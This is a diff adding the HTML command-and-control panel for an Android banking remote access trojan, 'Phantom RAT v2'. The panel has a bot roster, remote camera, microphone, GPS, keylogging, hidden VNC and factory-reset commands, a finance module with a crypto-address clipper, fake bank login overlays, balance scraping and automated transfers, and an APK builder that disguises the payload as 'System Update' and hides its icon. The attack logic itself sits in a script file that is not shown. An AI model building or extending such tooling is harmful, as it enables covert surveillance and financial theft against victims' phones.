@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Phantom RAT v2 — Command Center</title>
+<link rel="stylesheet" href="/style.css">
+</head>
+<body>
+
+<div id="login">
+  <div class="login-card">
+    <div class="logo">👻</div>
+    <h1>PHANTOM RAT <span style="color:var(--cyan)">v2</span></h1>
+    <div class="sub">Web Command &amp; Control</div>
+    <label>Username</label>
+    <input id="loginUser" value="admin">
+    <label>Password</label>
+    <input id="loginPass" type="password" value="phantom">
+    <button class="btn btn-p" style="width:100%;margin-top:20px" onclick="login()">🔓 Authenticate</button>
+  </div>
+</div>
+
+<div class="app hidden" id="app">
+  <aside class="sidebar">
+    <div class="brand"><div class="logo">👻</div><div><b>PHANTOM RAT</b><small>v2.0 · WEB C2</small></div></div>
+    <div class="nav-item active" data-v="dash" onclick="view('dash')">📊 Dashboard</div>
+    <div class="nav-item" data-v="bots" onclick="view('bots')">📱 Bots <span id="navBots" style="margin-left:auto"></span></div>
+    <div class="nav-item" data-v="cmd" onclick="view('cmd')">⚡ Command Center</div>
+    <div class="nav-item" data-v="fin" onclick="view('fin')">💳 Finance</div>
+    <div class="nav-item" data-v="build" onclick="view('build')">📦 APK Builder</div>
+    <div style="flex:1"></div>
+    <div class="nav-item" onclick="logout()">🚪 Logout</div>
+  </aside>
+
+  <main class="main">
+    <!-- DASHBOARD -->
+    <section id="v-dash">
+      <div class="topbar"><h2>Dashboard</h2><div class="spacer"></div><div class="live"><span class="dot"></span><span id="liveCount">0</span> online</div></div>
+      <div class="stats">
+        <div class="stat"><div class="l">Total Bots</div><div class="v" style="color:var(--green)" id="stTotal">0</div></div>
+        <div class="stat"><div class="l">Online</div><div class="v" style="color:var(--cyan)" id="stOnline">0</div></div>
+        <div class="stat"><div class="l">Commands</div><div class="v" style="color:var(--purple)" id="stCmds">0</div></div>
+        <div class="stat"><div class="l">Financial Hits</div><div class="v" style="color:var(--gold)" id="stFin">0</div></div>
+      </div>
+      <div class="grid-2">
+        <div class="card"><div class="card-head"><h3>🤖 Bot Roster</h3><button class="btn btn-g btn-sm" onclick="loadBots()">🔄</button></div>
+          <div style="overflow-x:auto"><table><thead><tr><th>Status</th><th>Device</th><th>Android</th><th>Country</th><th>Battery</th><th>Last Seen</th></tr></thead>
+          <tbody id="botTable"></tbody></table></div></div>
+        <div class="card"><div class="card-head"><h3>📡 Live Activity</h3></div>
+          <div class="card-body" style="padding:8px 16px"><div class="feed" id="activityFeed"></div></div></div>
+      </div>
+    </section>
+
+    <!-- BOTS -->
+    <section id="v-bots" class="hidden">
+      <div class="topbar"><h2>Bot Manager</h2><div class="spacer"></div><button class="btn btn-g" onclick="loadBots()">🔄 Refresh</button></div>
+      <div class="card"><div style="overflow-x:auto"><table><thead><tr><th>Status</th><th>ID</th><th>Device</th><th>Android</th><th>Country</th><th>IP</th><th>Battery</th><th>Last Seen</th><th></th></tr></thead>
+      <tbody id="botTableFull"></tbody></table></div></div>
+    </section>
+
+    <!-- COMMAND CENTER -->
+    <section id="v-cmd" class="hidden">
+      <div class="topbar"><h2>Command Center</h2><div class="spacer"></div>
+        <select id="cmdBotSel" style="width:260px" onchange="selectBot(this.value)"></select></div>
+      <div class="grid-2">
+        <div>
+          <div class="card"><div class="card-head"><h3>🎯 <span id="cmdTarget">No device</span></h3></div>
+            <div class="card-body"><div class="cats" id="cmdCats"></div><div class="cmd-grid" id="cmdGrid"></div></div></div>
+        </div>
+        <div class="card"><div class="card-head"><h3>📟 Command Console</h3><button class="btn btn-g btn-sm" onclick="clearConsole()">Clear</button></div>
+          <div class="card-body" style="padding:12px"><div class="console" id="cmdConsole"></div></div></div>
+      </div>
+    </section>
+
+    <!-- FINANCE -->
+    <section id="v-fin" class="hidden">
+      <div class="topbar"><h2>Finance Module</h2><div class="spacer"></div><button class="btn btn-gold" onclick="atsRun()">🤖 ATS Transfer</button></div>
+      <div class="grid-2">
+        <div class="card"><div class="card-head"><h3>💳 Wallet Targets <span class="tag t-gold">CLIPPER</span></h3></div>
+          <div class="card-body">
+            <label>Target bot</label>
+            <select id="finBotSel" onchange="loadWallet()"></select>
+            <div class="form-row" style="margin-top:10px">
+              <div><label>ETH wallet</label><input id="wEth" placeholder="0x..."></div>
+              <div><label>BTC wallet</label><input id="wBtc" placeholder="bc1q..."></div>
+            </div>
+            <div class="form-row"><div><label>TRC20 wallet</label><input id="wTrx" placeholder="T..."></div></div>
+            <div style="display:flex;gap:8px;flex-wrap:wrap">
+              <button class="btn btn-p btn-sm" onclick="saveWallet()">💾 Save Wallet</button>
+              <button class="btn btn-gold btn-sm" onclick="api('/api/finance/clipper','POST',{botId:sel('finBotSel')})">🔗 Enable Clipper</button>
+              <button class="btn btn-g btn-sm" onclick="api('/api/finance/scrape','POST',{botId:sel('finBotSel'),app:'all'})">🏦 Scrape Balance</button>
+              <button class="btn btn-g btn-sm" onclick="api('/api/finance/overlay','POST',{botId:sel('finBotSel'),app:'bank',kind:'login'})">💉 Fake Login Overlay</button>
+            </div>
+          </div></div>
+        <div class="card"><div class="card-head"><h3>📲 OTP / Balance Feed</h3></div>
+          <div class="card-body" style="padding:8px 16px"><div class="feed" id="finFeed"></div></div></div>
+      </div>
+      <div class="card"><div class="card-head"><h3>🤖 ATS — Automated Transfer</h3></div>
+        <div class="card-body">
+          <div class="frow3">
+            <div><label>Bot</label><select id="atsBotSel"></select></div>
+            <div><label>Beneficiary</label><input id="atsTarget" placeholder="IBAN / address"></div>
+            <div><label>Amount</label><input id="atsAmount" placeholder="2500.00"></div>
+          </div>
+          <button class="btn btn-gold" onclick="atsRun()">⚡ Execute ATS</button>
+          <div class="console" id="atsConsole" style="margin-top:12px;height:170px"></div>
+        </div></div>
+    </section>
+
+    <!-- BUILDER -->
+    <section id="v-build" class="hidden">
+      <div class="topbar"><h2>APK Builder</h2><div class="spacer"></div><span class="tag t-green" id="buildStatus">READY</span></div>
+      <div class="card"><div class="card-head"><h3>📦 Payload Configuration</h3></div>
+        <div class="card-body" style="max-width:560px">
+          <label>App name</label>
+          <input id="bName" value="System Update">
+          <label>C2 server URL (the URL this panel is served from)</label>
+          <input id="bServer" value="">
+          <div style="display:flex;align-items:center;gap:10px;margin-top:12px">
+            <input type="checkbox" id="bIconHidden" checked><span style="font-size:12.5px;color:var(--muted)">Hide icon after install</span>
+          </div>
+          <button class="btn btn-p" style="margin-top:16px" onclick="buildApk()">🚀 Build &amp; Download APK</button>
+        </div></div>
+    </section>
+  </main>
+</div>
+
+<!-- BOT MODAL -->
+<div class="modal" id="botModal"><div class="mcard">
+  <div class="mhead"><h3 id="modalTitle">Bot</h3><button class="btn btn-g btn-sm" onclick="closeModal()">✕</button></div>
+  <div class="detail-grid" id="botDetails"></div>
+  <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:14px">
+    <button class="btn btn-p btn-sm" onclick="quickCmd('camera_back')">📸 Camera</button>
+    <button class="btn btn-g btn-sm" onclick="quickCmd('mic_record')">🎙️ Mic</button>
+    <button class="btn btn-g btn-sm" onclick="quickCmd('gps_once')">📍 GPS</button>
+    <button class="btn btn-g btn-sm" onclick="quickCmd('keylog_start')">⌨️ Keylog</button>
+    <button class="btn btn-g btn-sm" onclick="quickCmd('screenshot')">🖼️ Screen</button>
+    <button class="btn btn-g btn-sm" onclick="quickCmd('start_hvnc')">🕹️ HVNC</button>
+    <button class="btn btn-gold btn-sm" onclick="quickCmd('balance_scrape')">🏦 Scrape</button>
+    <button class="btn btn-r btn-sm" onclick="quickCmd('factory_reset')">💥 Reset</button>
+  </div>
+</div></div>
+
+<div id="toasts"></div>
+<script src="/app.js"></script>
+</body>
+            </html>
